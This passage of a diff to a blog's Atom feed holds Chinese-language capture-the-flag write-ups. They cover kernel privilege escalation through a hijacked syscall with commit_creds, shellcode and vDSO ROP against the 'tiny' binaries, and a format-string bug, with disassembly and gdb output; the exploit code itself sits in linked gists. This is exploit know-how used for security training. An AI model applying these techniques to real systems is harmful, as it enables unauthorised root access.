+	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x61&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__init&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initmodule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;sct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SYS_CALL_TABLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;sct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NR_SYS_UNUSED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys_upper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;printk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sys_upper(number : 223) is added&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__exit&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exitmodule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;module_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;initmodule&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;module_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exitmodule&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;这题就是提供了一个可以&lt;code class=&quot;highlighter-rouge&quot;&gt;write-anything-anywhere&lt;/code&gt;的系统调用(也不算anything，有点限制)，系统调用的地址存在&lt;code class=&quot;highlighter-rouge&quot;&gt;0x8000e348+223 = 0x8000e6c4&lt;/code&gt;, flag在&lt;code class=&quot;highlighter-rouge&quot;&gt;/root/flag&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;按理说应该不难，但是我做了很久。后来想了一下，主要是内联汇编不熟(没有写好 clobbers 导致各种崩)。再就是没有深入理解 Linux 的权限控制机制，一开始想当然的觉得 kernel space 就肯定有 root 权限，后来发现就算用了系统调用，跑到奇怪的地址上执行，uid 还是这个进程的 uid&lt;sup id=&quot;fnref:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;. 所以尝试的 &lt;code class=&quot;highlighter-rouge&quot;&gt;open-read-write&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;chown()&lt;/code&gt;各种都已失败告终，权限不够。直接在 kernel space &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt;的我也是想多了。&lt;/p&gt;
+
+&lt;p&gt;其实思路还是挺简单的，首先修改 223 号系统调用的内容，然后调用这个修改过的 223 号系统调用，在 kernel space 把 uid 改掉，之后在 user space &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt;就好了。&lt;/p&gt;
+
+&lt;p&gt;在现在版本的 Linux 内核修改 uid，需要通过&lt;code class=&quot;highlighter-rouge&quot;&gt;prepare_creds()&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;commit_creds()&lt;/code&gt;两步&lt;sup id=&quot;fnref:2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;。这两个函数的地址存在&lt;code class=&quot;highlighter-rouge&quot;&gt;/proc/kallsyms&lt;/code&gt;:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/kallsyms | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'prepare_creds\|commit_creds'&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;8003f44c T prepare_creds
+8003f56c T commit_creds
+&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;我参考 @acama 的版本&lt;sup id=&quot;fnref:3&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:3&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;写了一个( @acama 的版本&lt;code class=&quot;highlighter-rouge&quot;&gt;prepare_creds()&lt;/code&gt;之后直接就&lt;code class=&quot;highlighter-rouge&quot;&gt;commit_creds()&lt;/code&gt;, 这估计只在老版本可以).&lt;code class=&quot;highlighter-rouge&quot;&gt;prepare_creds()&lt;/code&gt;返回的结构体定义可以看参考&lt;sup id=&quot;fnref:4&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:4&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;4&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/f582d787f04eca93f8eb&quot; data-gist-file=&quot;cred.s&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/f582d787f04eca93f8eb&quot;&gt;cubarco/f582d787f04eca93f8eb&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;p&gt;这个生成的指令是不能用原先的 223 号系统调用直接写进内存的，所以我准备了一个真正的&lt;code class=&quot;highlighter-rouge&quot;&gt;write-anything-anywhere&lt;/code&gt;的跳板:&lt;/p&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/f582d787f04eca93f8eb&quot; data-gist-file=&quot;waa.s&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/f582d787f04eca93f8eb&quot;&gt;cubarco/f582d787f04eca93f8eb&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;p&gt;先把 waa 写进内存，然后把 cred 写进内存。至于写到哪里，我随手写了两个地址: 0x83f5cafe, 0x83f6beee.&lt;/p&gt;
+
+&lt;h3 id=&quot;expc&quot;&gt;exp.c&lt;/h3&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/f582d787f04eca93f8eb&quot; data-gist-file=&quot;1-pwnable-rookiss-syscall.c&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/f582d787f04eca93f8eb&quot;&gt;cubarco/f582d787f04eca93f8eb&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
+
+&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:1&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;http://unix.stackexchange.com/questions/121715/what-is-the-relationship-between-root-and-kernel&quot;&gt;What is the relationship between root and kernel?&lt;/a&gt; &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:2&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://memset.wordpress.com/2010/12/28/syscall-hijacking-simple-rootkit-kernel-2-6-x/&quot;&gt;Syscall Hijacking: Simple Rootkit (kernel 2.6.x)&lt;/a&gt; &lt;a href=&quot;#fnref:2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:3&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://github.com/acama/arm-evt/blob/master/local_example/exploit/backdoor.asm&quot;&gt;arm-evt/local_example/exploit/backdoor.asm&lt;/a&gt; &lt;a href=&quot;#fnref:3&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:4&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;http://lxr.free-electrons.com/source/include/linux/cred.h?v=3.11#L102&quot;&gt;Linux/include/linux/cred.h&lt;/a&gt; &lt;a href=&quot;#fnref:4&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2015/12/writeup-pwnable-syscall/&quot;&gt;Writeup-Pwnable: syscall&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubl.in&quot;&gt;/home/cubarco&lt;/a&gt; on December 16, 2015.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Writeup-Pwnable: tiny & tiny_easy]]></title>
+  <link rel="alternate" type="text/html" href="https://cubl.in/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy/" />
+  <id>https://cubl.in/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy</id>
+  <published>2015-12-11T00:00:00+00:00</published>
+  <updated>2015-12-11T00:00:00+00:00</updated>
+  <author>
+    <name>Cubarco</name>
+    <uri>https://cubl.in</uri>
+    <email>i at cubl.in</email>
+  </author>
+  <content type="html">&lt;h2 id=&quot;tiny_easy&quot;&gt;tiny_easy&lt;/h2&gt;
+
+&lt;h4 id=&quot;1-brute-force&quot;&gt;1. Brute force&lt;/h4&gt;
+&lt;p&gt;这题的 bin 拿到之后开 gdb 看了一下 mapping, 发现 stack 是可执行的(如果 ELF 没有 GNU_STACK 这个 header, 则默认 stack 可执行&lt;sup id=&quot;fnref:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;)。所以思路很明显了。&lt;/p&gt;
+
+&lt;p&gt;看一下反汇编:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objdump&quot; data-lang=&quot;objdump&quot;&gt;8048054:	58             pop %eax
+8048055:	5a             pop %edx
+8048056:	8b12           mov (%edx),%edx
+8048058:	ffd2           call *%edx&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;然后用 gdb 断在 entry point, 观察一下栈:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;gdb tiny_easy
+&lt;span class=&quot;go&quot;&gt;(gdb) b *0x8048054
+Breakpoint 1 at 0x8048054
+(gdb) r
+Starting program: /home/tiny_easy/tiny_easy
+
+Breakpoint 1, 0x08048054 in ?? ()
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;(gdb) x/32wx $&lt;/span&gt;esp
+&lt;span class=&quot;go&quot;&gt;0xffd82d70: 0x00000001  0xffd84df5  0x00000000  0xffd84e0f
+0xffd82d80: 0xffd84e1f  0xffd84e33  0xffd84e54  0xffd84e68
+0xffd82d90: 0xffd84e77  0xffd84e83  0xffd84ed0  0xffd84ee9
+0xffd82da0: 0xffd84ef8  0xffd84f0c  0xffd84f1d  0xffd84f63
+0xffd82db0: 0xffd84f6c  0xffd84f81  0xffd84f89  0xffd84f99
+0xffd82dc0: 0xffd84fab  0x00000000  0x00000020  0xf776bb50
+0xffd82dd0: 0x00000021  0xf776b000  0x00000010  0x0fabfbff
+0xffd82de0: 0x00000006  0x00001000  0x00000011  0x00000064&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;发现 $esp 位置是命令行参数的个数(即 argc)，后面借着的都是 argv[i], 以 NULL 结尾，再之后都是环境变量(即 envp)。&lt;/p&gt;
+
+&lt;p&gt;观察到这里，这题就有了一个很明显的解法，即在 argv[0] 里面放猜测的栈中的某个地址，然后跳到存在 argv[1…n] 里面的 shellcode. 但是由于 ASLR, 需要用很多 nop 来填充 stack, 来增加 bruteforce 的命中率。&lt;/p&gt;
+
+&lt;h6 id=&quot;exptiny_easyc&quot;&gt;exp.tiny_easy.c&lt;/h6&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/03fb090852a3303f58db&quot; data-gist-file=&quot;pwnable-rookiss-tiny-easy.c&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/03fb090852a3303f58db&quot;&gt;cubarco/03fb090852a3303f58db&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;2-vdso&quot;&gt;2. vDSO&lt;sup id=&quot;fnref:2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/h4&gt;
+
+&lt;p&gt;这个思路是在做 tiny 的时候得来的。简单来说就是利用 vdso 里面的 gadgets 准确的跳到 shellcode。虽然 ASLR 会导致 vdso 的加载位置随机，但是在 shell 中执行&lt;code class=&quot;highlighter-rouge&quot;&gt;ulimit -s unlimited&lt;/code&gt;可以关掉随机 mmap&lt;sup id=&quot;fnref:3&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:3&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;vdso 可以在 gdb 调试的时候用 dump&lt;sup id=&quot;fnref:4&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:4&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; 命令导出。&lt;/em&gt;&lt;/p&gt;
+
+&lt;h6 id=&quot;exptiny_easypy&quot;&gt;exp.tiny_easy.py&lt;/h6&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/03fb090852a3303f58db&quot; data-gist-file=&quot;pwnable-rookiss-tiny-easy.py&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/03fb090852a3303f58db&quot;&gt;cubarco/03fb090852a3303f58db&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;tiny&quot;&gt;tiny&lt;/h2&gt;
+
+&lt;p&gt;这题就是 tiny_easy 开 NX 的版本，只好 ROP. 能用的 gadgets 只有 vdso 和 text 段 6 个字节的指令(哭).&lt;/p&gt;
+
+&lt;p&gt;具体怎么构造 ROP, 绞尽脑汁想了很久。目的就是一个: &lt;code class=&quot;highlighter-rouge&quot;&gt;execv(&quot;/bin/sh&quot;)&lt;/code&gt;，而执行这个系统调用需要将 eax 设置为 0xb，ebx 设置为字符串指针。前者很容易实现，只要控制 argc 为 11 就可以，麻烦的是 ebx.&lt;/p&gt;
+
+&lt;p&gt;一开始想怎么改 ebp 和 esp 的值，让 ret 指令返回地址能受我的控制，之后方便构造 ROP chain. 在草稿纸上写写画画试了很久没有成功，遂放弃。之后洗了个澡，回来重新看 stack 里面的内容，有了很重要的收获。&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;(gdb) x/32wx $esp
+...
+0xffd82dc0: 0xffd84fab  0x00000000  0x00000020  0xf776bb50
+0xffd82dd0: 0x00000021  0xf776b000  0x00000010  0x0fabfbff
+...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;截取了上文中的一部分 stack 数据，可以发现在 0xffd82dec 的位置有个 0xf776bb50, 看了一下，是 vdso 中&lt;code class=&quot;highlighter-rouge&quot;&gt;__kernel_vsyscall&lt;/code&gt;的起始位置，如果可以 ret 到这里，就能调用系统调用了。&lt;/p&gt;
+
+&lt;p&gt;然后开始找 gadgets.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objdump&quot; data-lang=&quot;objdump&quot;&gt;5c8:	83 c4 3c             	add    $0x3c,%esp
+5cb:	5b                   	pop    %ebx
+5cc:	5e                   	pop    %esi
+5cd:	5f                   	pop    %edi
+5ce:	5d                   	pop    %ebp
+5cf:	c3                   	ret&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;GOTCHA!!! 这里将栈指针增加了 0x3c, 然后&lt;code class=&quot;highlighter-rouge&quot;&gt;pop %ebx&lt;/code&gt;顺便满足了 execv 系统调用的第二个要求。仔细观察了栈的内容，只要保证有 11 个命令行参数，5 个环境变量就能完成 execv 的调用，其中第四个环境变量的字符串是执行路径。&lt;/p&gt;
+
+&lt;h6 id=&quot;exptinysh&quot;&gt;exp.tiny.sh&lt;/h6&gt;
+&lt;p&gt;这个 exp 的核心是 C (其实就是一句&lt;code class=&quot;highlighter-rouge&quot;&gt;execle()&lt;/code&gt;的事情), 用 shell 写只是为了方便，可以把&lt;code class=&quot;highlighter-rouge&quot;&gt;ulimit -s unlimited&lt;/code&gt;这些命令放在一起(调试过程中还用到了其他命令，最后删的只剩 ulimit…)，而且用一个脚本解题本身是一件很酷的事情XD.&lt;/p&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/d379e31c9487c8ee07f2&quot; data-gist-file=&quot;pwnable-hackerssecret-tiny.sh&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/d379e31c9487c8ee07f2&quot;&gt;cubarco/d379e31c9487c8ee07f2&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+
+&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:1&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://wiki.gentoo.org/wiki/Hardened/GNU_stack_quickstart#Causes_of_executable_stack_markings&quot;&gt;Causes of executable stack markings&lt;/a&gt; &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:2&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/VDSO&quot;&gt;vDSO&lt;/a&gt; &lt;a href=&quot;#fnref:2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:3&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;http://security.cs.pub.ro/hexcellents/wiki/kb/exploiting/home#address-space-layout-randomization&quot;&gt;Address space layout randomization&lt;/a&gt; &lt;a href=&quot;#fnref:3&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:4&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://sourceware.org/gdb/onlinedocs/gdb/Dump_002fRestore-Files.html&quot;&gt;Debugging with GDB#Copy Between Memory and a File&lt;/a&gt; &lt;a href=&quot;#fnref:4&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy/&quot;&gt;Writeup-Pwnable: tiny &amp; tiny_easy&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubl.in&quot;&gt;/home/cubarco&lt;/a&gt; on December 11, 2015.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Writeup-Seccon CTF: FSB:TreeWalker]]></title>
+  <link rel="alternate" type="text/html" href="https://cubl.in/blog/2015/12/seccon-ctf-writeup-fsb-treewalker/" />
+  <id>https://cubl.in/blog/2015/12/seccon-ctf-writeup-fsb-treewalker</id>
+  <updated>2015-12-13T00:00:00-00:00</updated>
+  <published>2015-12-07T00:00:00+00:00</published>
+  
+  <author>
+    <name>Cubarco</name>
+    <uri>https://cubl.in</uri>
+    <email>i at cubl.in</email>
+  </author>
+  <content type="html">&lt;h3 id=&quot;printf&quot;&gt;printf()&lt;/h3&gt;
+
+&lt;p&gt;因为这题直接把 FSB 写在题名里，我一拿到题就直接跑去找能利用 FSB 的点了。&lt;/p&gt;
+
+&lt;p&gt;利用点在这里：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objdump&quot; data-lang=&quot;objdump&quot;&gt;400881:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
+400888:	4c 8b 05 f9 09 20 00 	mov    0x2009f9(%rip),%r8        # 601288 &amp;lt;stdin@@GLIBC_2.2.5&amp;gt;
+40088f:	48 8d 7c 24 50       	lea    0x50(%rsp),%rdi
+400894:	ba 01 00 00 00       	mov    $0x1,%edx
+400899:	be 00 10 00 00       	mov    $0x1000,%esi
+40089e:	e8 fd fe ff ff       	callq  4007a0 &amp;lt;__fread_chk@plt&amp;gt;
+4008a3:	48 39 44 24 08       	cmp    %rax,0x8(%rsp)
+4008a8:	0f 85 81 00 00 00    	jne    40092f &amp;lt;main+0x14f&amp;gt;
+4008ae:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi
+4008b3:	bf 01 00 00 00       	mov    $0x1,%edi
+4008b8:	31 c0                	xor    %eax,%eax
+4008ba:	e8 d1 fe ff ff       	callq  400790 &amp;lt;__printf_chk@plt&amp;gt;
+4008bf:	48 8b 0d c2 09 20 00 	mov    0x2009c2(%rip),%rcx        # 601288 &amp;lt;stdin@@GLIBC_2.2.5&amp;gt;
+4008c6:	48 8d 7c 24 08       	lea    0x8(%rsp),%rdi
+4008cb:	ba 01 00 00 00       	mov    $0x1,%edx
+4008d0:	be 08 00 00 00       	mov    $0x8,%esi
+4008d5:	e8 36 fe ff ff       	callq  400710 &amp;lt;fread@plt&amp;gt;
+4008da:	48 83 f8 01          	cmp    $0x1,%rax
+4008de:	75 1e                	jne    4008fe &amp;lt;main+0x11e&amp;gt;
+4008e0:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
+4008e5:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
+4008ec:	77 10                	ja     4008fe &amp;lt;main+0x11e&amp;gt;
+4008ee:	48 85 c9             	test   %rcx,%rcx
+4008f1:	75 95                	jne    400888 &amp;lt;main+0xa8&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;在 0x4008ba 会有 printf 输出缓冲区，其内容来自用户输入，此处可以构造 format string 来 leak 内存或者是其他非法操作(利用%n)。&lt;/p&gt;
+
